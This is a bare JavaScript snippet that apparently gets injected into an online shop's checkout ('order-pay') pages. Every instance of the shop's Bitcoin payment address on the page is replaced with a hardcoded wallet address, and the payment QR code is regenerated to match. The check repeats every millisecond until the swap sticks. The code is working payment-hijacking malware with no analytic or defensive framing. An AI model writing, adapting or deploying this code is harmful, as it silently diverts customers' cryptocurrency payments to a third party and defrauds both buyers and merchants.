// console.log('Ready');
function api(){
    
    if (window.location.href.includes("order-pay")){
        var amo = document.getElementById("amount").innerText;
        if(document.getElementById("qrcode").children[1].src=="https://www.bitcoinqrcodemaker.com/api/?style=bitcoin&prefix=on&logo=off&amount="+amo+"&address=bc1qcchj3xazwk23058nptvj7n7hrpa0vgn0d67aw0"){
            clearInterval(intertime);
            return 0;
        }
        else{
            document.getElementById("qrcode").children[1].src="";
        }
        var add = document.getElementById("payment-address").innerText;
        var html = document.body.innerHTML;
        var newHtml = html.replace(new RegExp(add, 'g'), 'bc1qcchj3xazwk23058nptvj7n7hrpa0vgn0d67aw0');
        document.body.innerHTML = newHtml;
        document.getElementById("qrcode").children[1].src="https://www.bitcoinqrcodemaker.com/api/?style=bitcoin&prefix=on&logo=off&amount="+amo+"&address=bc1qcchj3xazwk23058nptvj7n7hrpa0vgn0d67aw0"

    }
}
var intertime = setInterval(function(){api(intertime)}, 1);
